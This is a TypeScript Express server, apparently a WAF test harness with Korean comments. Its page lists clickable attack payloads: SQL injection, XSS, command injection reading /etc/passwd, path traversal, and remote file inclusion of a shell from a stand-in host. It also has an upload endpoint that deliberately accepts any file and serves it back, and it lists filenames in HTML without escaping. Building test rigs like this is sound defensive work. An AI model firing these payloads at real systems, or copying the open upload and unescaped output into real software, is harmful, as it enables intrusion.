import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const app = express();
const PORT = process.env.PORT || 4000;

// 업로드 디렉토리 생성
const uploadDir = path.join(__dirname, '..', 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// Multer 설정 - 파일 저장 설정
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    // 원본 파일명 + 타임스탬프
    const ext = path.extname(file.originalname);
    const name = path.basename(file.originalname, ext);
    cb(null, `${name}_${Date.now()}${ext}`);
  },
});

// WAF에서 악성 파일 차단을 처리하므로 여기서는 모든 파일 허용

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB 제한
  },
});

// JSON 파싱 미들웨어
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 정적 파일 서빙
app.use('/uploads', express.static(uploadDir));

// 메인 페이지 - WAF 테스트 메뉴
app.get('/', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAF 테스트 - Tenant Example</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            max-width: 1000px; 
            margin: 0 auto; 
            padding: 40px 20px;
            background-color: #ffffff;
            color: #000000;
            line-height: 1.6;
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 50px;
            color: #000000;
            font-weight: 300;
        }
        .test-section {
            border: 1px solid #cccccc;
            border-radius: 8px;
            padding: 30px;
            margin-bottom: 30px;
            background-color: #ffffff;
        }
        .test-section h2 {
            color: #000000;
            font-size: 1.5em;
            margin-top: 0;
            margin-bottom: 20px;
            font-weight: 400;
        }
        .test-item {
            margin-bottom: 15px;
            padding: 15px;
            border-left: 3px solid #666666;
            background-color: #f9f9f9;
        }
        .test-item h3 {
            margin: 0 0 8px 0;
            color: #000000;
            font-size: 1.1em;
            font-weight: 500;
        }
        .test-url {
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            color: #666666;
            background-color: #f5f5f5;
            padding: 5px 8px;
            border-radius: 4px;
            word-break: break-all;
            margin: 5px 0;
        }
        .test-link {
            display: inline-block;
            margin-top: 8px;
            padding: 8px 16px;
            background-color: #000000;
            color: #ffffff;
            text-decoration: none;
            border-radius: 4px;
            font-size: 0.9em;
            transition: background-color 0.2s;
        }
        .test-link:hover {
            background-color: #333333;
        }
        .upload-form {
            text-align: center;
        }
        .upload-form input[type="file"] {
            margin: 10px;
            padding: 8px;
            border: 1px solid #cccccc;
            border-radius: 4px;
        }
        .upload-form button {
            padding: 10px 20px;
            background-color: #000000;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
        }
        .upload-form button:hover {
            background-color: #333333;
        }
        .file-list-btn {
            text-align: center;
            margin-top: 20px;
        }
        .file-list-btn a {
            display: inline-block;
            padding: 10px 20px;
            background-color: #666666;
            color: #ffffff;
            text-decoration: none;
            border-radius: 4px;
        }
        .file-list-btn a:hover {
            background-color: #888888;
        }
    </style>
</head>
<body>
    <h1>WAF 보안 테스트</h1>
    
    <div class="test-section">
        <h2>1. SQL Injection 테스트</h2>
        <div class="test-item">
            <h3>OR 조건 우회</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?q=' OR '1'='1</div>
            <a href="http://waf-tenant.kro.kr/?q=' OR '1'='1" target="_blank" class="test-link">테스트 실행</a>
        </div>
        <div class="test-item">
            <h3>UNION SELECT 공격</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?id=1 UNION SELECT * FROM users--</div>
            <a href="http://waf-tenant.kro.kr/?id=1 UNION SELECT * FROM users--" target="_blank" class="test-link">테스트 실행</a>
        </div>
    </div>

    <div class="test-section">
        <h2>2. Cross-Site Scripting (XSS) 테스트</h2>
        <div class="test-item">
            <h3>기본 스크립트 태그</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?q=&lt;script&gt;alert(1)&lt;/script&gt;</div>
            <a href="http://waf-tenant.kro.kr/?q=<script>alert(1)</script>" target="_blank" class="test-link">테스트 실행</a>
        </div>
        <div class="test-item">
            <h3>이미지 태그 onerror</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?search=&lt;img src=x onerror=alert('XSS')&gt;</div>
            <a href="http://waf-tenant.kro.kr/?search=<img src=x onerror=alert('XSS')>" target="_blank" class="test-link">테스트 실행</a>
        </div>
    </div>

    <div class="test-section">
        <h2>3. Command Injection 테스트</h2>
        <div class="test-item">
            <h3>세미콜론 명령어 연결</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?cmd=; ls -la</div>
            <a href="http://waf-tenant.kro.kr/?cmd=; ls -la" target="_blank" class="test-link">테스트 실행</a>
        </div>
        <div class="test-item">
            <h3>AND 연산자 명령어 연결</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?exec=&& cat /etc/passwd</div>
            <a href="http://waf-tenant.kro.kr/?exec=&& cat /etc/passwd" target="_blank" class="test-link">테스트 실행</a>
        </div>
    </div>

    <div class="test-section">
        <h2>4. LFI/RFI & 경로 조작 테스트</h2>
        <div class="test-item">
            <h3>Local File Inclusion (LFI)</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?file=../../../etc/passwd</div>
            <a href="http://waf-tenant.kro.kr/?file=../../../etc/passwd" target="_blank" class="test-link">테스트 실행</a>
        </div>
        <div class="test-item">
            <h3>Remote File Inclusion (RFI)</h3>
            <div class="test-url">http://waf-tenant.kro.kr/?include=http://malicious.com/shell.php</div>
            <a href="http://waf-tenant.kro.kr/?include=http://malicious.com/shell.php" target="_blank" class="test-link">테스트 실행</a>
        </div>
    </div>

    <div class="test-section">
        <h2>5. 악성 파일 업로드 테스트</h2>
        <div class="upload-form">
            <p>PHP, JSP, ASP, 실행파일 등 악성 파일을 업로드해서 WAF 차단 기능을 테스트하세요.</p>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit">파일 업로드</button>
            </form>
        </div>
        <div class="file-list-btn">
            <a href="/file-list">업로드된 파일 목록 보기</a>
        </div>
    </div>
</body>
</html>
  `;
  res.send(html);
});

// 파일 업로드 엔드포인트
app.post('/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: '파일이 선택되지 않았습니다.' });
    }

    console.log('파일 업로드 성공:', req.file);
    res.json({
      message: '파일 업로드 성공!',
      filename: req.file.filename,
      originalname: req.file.originalname,
      size: req.file.size,
      path: `/uploads/${req.file.filename}`,
    });
  } catch (error) {
    console.error('파일 업로드 에러:', error);
    res.status(500).json({ error: '파일 업로드 실패' });
  }
});

// 업로드 에러 핸들링
app.use((error: any, req: any, res: any, next: any) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res
        .status(400)
        .json({ error: '파일 크기가 너무 큽니다. (최대 10MB)' });
    }
  }

  res.status(500).json({ error: '서버 에러가 발생했습니다.' });
});

// 업로드된 파일 목록 조회 (JSON)
app.get('/files', (req, res) => {
  try {
    const files = fs.readdirSync(uploadDir);
    const fileList = files.map((filename) => {
      const filePath = path.join(uploadDir, filename);
      const stats = fs.statSync(filePath);
      return {
        filename,
        size: stats.size,
        uploadDate: stats.birthtime,
        url: `/uploads/${filename}`,
      };
    });

    res.json({ files: fileList });
  } catch (error) {
    res.status(500).json({ error: '파일 목록을 불러올 수 없습니다.' });
  }
});

// 업로드된 파일 목록 조회 (HTML)
app.get('/file-list', (req, res) => {
  try {
    const files = fs.readdirSync(uploadDir);

    let fileListHtml = '';
    if (files.length === 0) {
      fileListHtml =
        '<p style="text-align: center; color: #666666; margin: 40px 0;">업로드된 파일이 없습니다.</p>';
    } else {
      fileListHtml = files
        .map((filename) => {
          const filePath = path.join(uploadDir, filename);
          const stats = fs.statSync(filePath);
          const fileSize = (stats.size / 1024).toFixed(2);
          const uploadDate = stats.birthtime.toLocaleString('ko-KR');

          return `
          <div class="file-item">
            <div class="file-info">
              <h3>${filename}</h3>
              <div class="file-meta">
                <span>크기: ${fileSize} KB</span>
                <span>업로드: ${uploadDate}</span>
              </div>
            </div>
            <div class="file-actions">
              <a href="/uploads/${filename}" target="_blank" class="download-btn">다운로드</a>
            </div>
          </div>
        `;
        })
        .join('');
    }

    const html = `
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>업로드된 파일 목록 - WAF 테스트</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            max-width: 800px; 
            margin: 0 auto; 
            padding: 40px 20px;
            background-color: #ffffff;
            color: #000000;
            line-height: 1.6;
        }
        h1 {
            text-align: center;
            font-size: 2em;
            margin-bottom: 40px;
            color: #000000;
            font-weight: 300;
        }
        .back-btn {
            display: inline-block;
            margin-bottom: 30px;
            padding: 10px 20px;
            background-color: #666666;
            color: #ffffff;
            text-decoration: none;
            border-radius: 4px;
        }
        .back-btn:hover {
            background-color: #888888;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            margin-bottom: 15px;
            border: 1px solid #cccccc;
            border-radius: 8px;
            background-color: #f9f9f9;
        }
        .file-info h3 {
            margin: 0 0 8px 0;
            color: #000000;
            font-size: 1.1em;
            font-weight: 500;
        }
        .file-meta {
            color: #666666;
            font-size: 0.9em;
        }
        .file-meta span {
            margin-right: 20px;
        }
        .download-btn {
            padding: 8px 16px;
            background-color: #000000;
            color: #ffffff;
            text-decoration: none;
            border-radius: 4px;
            font-size: 0.9em;
        }
        .download-btn:hover {
            background-color: #333333;
        }
        @media (max-width: 600px) {
            .file-item {
                flex-direction: column;
                align-items: flex-start;
            }
            .file-actions {
                margin-top: 15px;
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <a href="/" class="back-btn">← 메인으로 돌아가기</a>
    <h1>업로드된 파일 목록</h1>
    
    ${fileListHtml}
</body>
</html>
    `;

    res.send(html);
  } catch (error) {
    res.status(500).send(`
      <html>
        <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
          <h1>오류 발생</h1>
          <p>파일 목록을 불러올 수 없습니다.</p>
          <a href="/">메인으로 돌아가기</a>
        </body>
      </html>
    `);
  }
});

// 서버 시작
app.listen(PORT, () => {
  console.log(`Server on: http://localhost:${PORT}`);
  console.log(`파일 업로드 테스트: http://localhost:${PORT}`);
  console.log(`업로드 디렉토리: ${uploadDir}`);
});

export default app;
